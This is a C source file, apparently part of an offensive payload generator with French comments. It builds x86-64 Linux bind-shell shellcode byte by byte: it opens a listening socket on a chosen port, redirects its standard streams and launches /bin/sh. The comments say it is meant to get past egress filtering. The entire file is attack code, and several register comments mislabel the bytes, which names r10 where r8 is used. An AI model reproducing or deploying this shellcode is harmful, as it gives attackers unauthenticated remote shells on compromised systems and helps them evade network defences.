#include "../include/payload_generator.h"
#include <arpa/inet.h>
#include <string.h>

/**
 * Génère un shellcode bind shell (écoute sur la cible au lieu de reverse)
 * Contourne l'egress filtering car c'est une connexion entrante
 * @param lport: Port sur lequel le bind shell écoutera (sur la cible)
 * @param shellcode: Buffer de sortie
 * @return: Taille du shellcode généré, ou -1 en cas d'erreur
 */
int generate_bind_shell_linux(int lport, unsigned char *shellcode) {
    unsigned char port_hi, port_lo;
    int i;
    
    // Valider le port
    if (lport < 1 || lport > 65535) {
        return -1;
    }
    
    // Extraire les bytes du port (network byte order)
    port_hi = (lport >> 8) & 0xFF;
    port_lo = lport & 0xFF;
    
    i = 0;
    
    // ============================================
    // Étape 1 : socket(AF_INET, SOCK_STREAM, 0)
    // ============================================
    shellcode[i++] = 0x48; shellcode[i++] = 0x31; shellcode[i++] = 0xc0;  // xor rax, rax
    shellcode[i++] = 0x48; shellcode[i++] = 0x31; shellcode[i++] = 0xff;  // xor rdi, rdi
    shellcode[i++] = 0x48; shellcode[i++] = 0x31; shellcode[i++] = 0xf6;  // xor rsi, rsi
    shellcode[i++] = 0x48; shellcode[i++] = 0x31; shellcode[i++] = 0xd2;  // xor rdx, rdx
    shellcode[i++] = 0x4d; shellcode[i++] = 0x31; shellcode[i++] = 0xc0;  // xor r10, r10
    shellcode[i++] = 0x6a; shellcode[i++] = 0x02;  // push 2
    shellcode[i++] = 0x5f;  // pop rdi
    shellcode[i++] = 0x6a; shellcode[i++] = 0x01;  // push 1
    shellcode[i++] = 0x5e;  // pop rsi
    shellcode[i++] = 0x6a; shellcode[i++] = 0x06;  // push 6
    shellcode[i++] = 0x5a;  // pop rdx
    shellcode[i++] = 0x6a; shellcode[i++] = 0x29;  // push 41 (sys_socket)
    shellcode[i++] = 0x58;  // pop rax
    shellcode[i++] = 0x0f; shellcode[i++] = 0x05;  // syscall
    shellcode[i++] = 0x49; shellcode[i++] = 0x89; shellcode[i++] = 0xc0;  // mov r10, rax
    
    // ============================================
    // Étape 2 : bind(sockfd, &sockaddr, 16)
    // ============================================
    shellcode[i++] = 0x48; shellcode[i++] = 0x31; shellcode[i++] = 0xf6;  // xor rsi, rsi
    shellcode[i++] = 0x4d; shellcode[i++] = 0x31; shellcode[i++] = 0xd2;  // xor rdx, rdx
    shellcode[i++] = 0x41; shellcode[i++] = 0x52;  // push r10 (padding)
    shellcode[i++] = 0xc6; shellcode[i++] = 0x04; shellcode[i++] = 0x24; shellcode[i++] = 0x02;  // mov byte [rsp], 2 (AF_INET)
    
    // Port (network byte order) - 2 bytes
    shellcode[i++] = 0x66; shellcode[i++] = 0xc7; shellcode[i++] = 0x44; shellcode[i++] = 0x24; shellcode[i++] = 0x02;  // mov word [rsp+2], ...
    shellcode[i++] = port_hi;  // Port high byte
    shellcode[i++] = port_lo;  // Port low byte
    
    // IP = 0.0.0.0 (écoute sur toutes les interfaces)
    shellcode[i++] = 0xc7; shellcode[i++] = 0x44; shellcode[i++] = 0x24; shellcode[i++] = 0x04;  // mov dword [rsp+4], ...
    shellcode[i++] = 0x00;  // IP byte 1
    shellcode[i++] = 0x00;  // IP byte 2
    shellcode[i++] = 0x00;  // IP byte 3
    shellcode[i++] = 0x00;  // IP byte 4
    
    shellcode[i++] = 0x48; shellcode[i++] = 0x89; shellcode[i++] = 0xe6;  // mov rsi, rsp
    shellcode[i++] = 0x6a; shellcode[i++] = 0x10;  // push 16
    shellcode[i++] = 0x5a;  // pop rdx
    shellcode[i++] = 0x41; shellcode[i++] = 0x50;  // push r10
    shellcode[i++] = 0x5f;  // pop rdi
    shellcode[i++] = 0x6a; shellcode[i++] = 0x31;  // push 49 (sys_bind)
    shellcode[i++] = 0x58;  // pop rax
    shellcode[i++] = 0x0f; shellcode[i++] = 0x05;  // syscall
    
    // ============================================
    // Étape 3 : listen(sockfd, 0)
    // ============================================
    shellcode[i++] = 0x48; shellcode[i++] = 0x31; shellcode[i++] = 0xf6;  // xor rsi, rsi
    shellcode[i++] = 0x6a; shellcode[i++] = 0x32;  // push 50 (sys_listen)
    shellcode[i++] = 0x58;  // pop rax
    shellcode[i++] = 0x0f; shellcode[i++] = 0x05;  // syscall
    
    // ============================================
    // Étape 4 : accept(sockfd, NULL, NULL)
    // ============================================
    shellcode[i++] = 0x48; shellcode[i++] = 0x31; shellcode[i++] = 0xf6;  // xor rsi, rsi
    shellcode[i++] = 0x48; shellcode[i++] = 0x31; shellcode[i++] = 0xd2;  // xor rdx, rdx
    shellcode[i++] = 0x6a; shellcode[i++] = 0x2b;  // push 43 (sys_accept)
    shellcode[i++] = 0x58;  // pop rax
    shellcode[i++] = 0x0f; shellcode[i++] = 0x05;  // syscall
    shellcode[i++] = 0x49; shellcode[i++] = 0x89; shellcode[i++] = 0xc0;  // mov r10, rax (nouveau sockfd)
    
    // ============================================
    // Étape 5 : dup2(clientfd, 0/1/2)
    // ============================================
    shellcode[i++] = 0x48; shellcode[i++] = 0x31; shellcode[i++] = 0xf6;  // xor rsi, rsi
    shellcode[i++] = 0x6a; shellcode[i++] = 0x03;  // push 3
    shellcode[i++] = 0x5e;  // pop rsi
    
    // dup_loop:
    shellcode[i++] = 0x48; shellcode[i++] = 0xff; shellcode[i++] = 0xce;  // dec rsi
    shellcode[i++] = 0x41; shellcode[i++] = 0x50;  // push r10
    shellcode[i++] = 0x5f;  // pop rdi
    shellcode[i++] = 0x6a; shellcode[i++] = 0x21;  // push 33 (sys_dup2)
    shellcode[i++] = 0x58;  // pop rax
    shellcode[i++] = 0x0f; shellcode[i++] = 0x05;  // syscall
    shellcode[i++] = 0x75; shellcode[i++] = 0xf6;  // jnz dup_loop
    
    // ============================================
    // Étape 6 : execve("/bin/sh", ["/bin/sh", NULL], NULL)
    // ============================================
    shellcode[i++] = 0x48; shellcode[i++] = 0x31; shellcode[i++] = 0xff;  // xor rdi, rdi
    shellcode[i++] = 0x57;  // push rdi
    shellcode[i++] = 0x57;  // push rdi
    shellcode[i++] = 0x5e;  // pop rsi
    shellcode[i++] = 0x5a;  // pop rdx
    shellcode[i++] = 0x48; shellcode[i++] = 0xbf;  // mov rdi, ...
    // "//bin/sh" en little-endian (8 bytes)
    shellcode[i++] = 0x2f; shellcode[i++] = 0x2f;  // "//"
    shellcode[i++] = 0x62; shellcode[i++] = 0x69;  // "bi"
    shellcode[i++] = 0x6e; shellcode[i++] = 0x2f;  // "n/"
    shellcode[i++] = 0x73; shellcode[i++] = 0x68;  // "sh"
    shellcode[i++] = 0x48; shellcode[i++] = 0xc1; shellcode[i++] = 0xef; shellcode[i++] = 0x08;  // shr rdi, 8
    shellcode[i++] = 0x57;  // push rdi
    shellcode[i++] = 0x54;  // push rsp
    shellcode[i++] = 0x5f;  // pop rdi
    shellcode[i++] = 0x6a; shellcode[i++] = 0x3b;  // push 59 (sys_execve)
    shellcode[i++] = 0x58;  // pop rax
    shellcode[i++] = 0x0f; shellcode[i++] = 0x05;  // syscall
    
    return i;  // Retourner la taille du shellcode
}

